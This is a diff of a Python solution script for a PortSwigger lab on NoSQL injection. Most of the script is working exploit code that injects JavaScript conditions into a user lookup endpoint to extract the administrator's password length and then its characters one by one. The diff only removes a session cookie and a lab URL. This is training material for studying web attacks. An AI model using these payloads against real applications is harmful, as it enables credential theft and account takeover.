@@ -1,12 +1,13 @@
+# Portswigger Lab: Exploiting NoSQL injection to extract data
 import requests
 from termcolor import colored
 
-cookies = {"session": "B9XQ7x9aiuHQqH3tBDE84nsCjabbVodu"}  # Set the cookie session value
+cookies = {"session": ""}  # Set the session value.
 
 def get_password_length():
     for length in range(1,21):
         payload=f"administrator'+%26%26+this.password.length+%3d%3d{length}+||+'1'%3d%3d'2"
-        url = f"https://0a58007803c5aa048053ef0800da0074.web-security-academy.net/user/lookup?user={payload}"   # Change the new Lab URL
+        url = f"https://web-security-academy.net/user/lookup?user={payload}"   # Change Lab URL
         response = requests.get(url, cookies=cookies)
         
         if "administrator" in response.text:
@@ -24,7 +25,7 @@ def get_password(password_length):
         print(colored(f"\nTrying Position number {char_position+1}:\n","red")) 
         for char in chars:
             payload=f"administrator'+%26%26+this.password[{char_position}]%3d%3d'{char}"
-            url = f"https://0a58007803c5aa048053ef0800da0074.web-security-academy.net/user/lookup?user={payload}" # Change the new Lab URL     
+            url = f"https://web-security-academy.net/user/lookup?user={payload}" # Change Lab URL     
             response = requests.get(url, cookies=cookies)
 
             if "administrator" in response.text:
